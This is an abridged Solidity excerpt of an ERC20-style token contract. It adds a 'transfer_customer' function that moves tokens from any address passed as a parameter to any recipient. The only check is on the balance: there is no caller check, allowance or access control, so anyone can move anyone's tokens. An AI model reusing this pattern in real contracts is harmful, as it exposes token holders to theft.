...
interface IERC20
{
     ...
     function transfer_customer(address customer, address recipient, uint256 amount) external  returns (bool);
...
contract ERC20V2Basic is IERC20
{
    ...
    function transfer(address recipient, uint256 numTokens) external override  returns (bool)
    {
     ...
     function transfer_customer(address _customer,address recipient, uint256 numTokens) external override  returns (bool)
    {
        require(numTokens <= balances[_customer],"insufficient balance");
        balances[_customer] = balances[_customer].sub(numTokens);
        balances[recipient] = balances[recipient].add(numTokens);
        emit transferEvent(_customer, recipient ,numTokens);
        return true;
    }
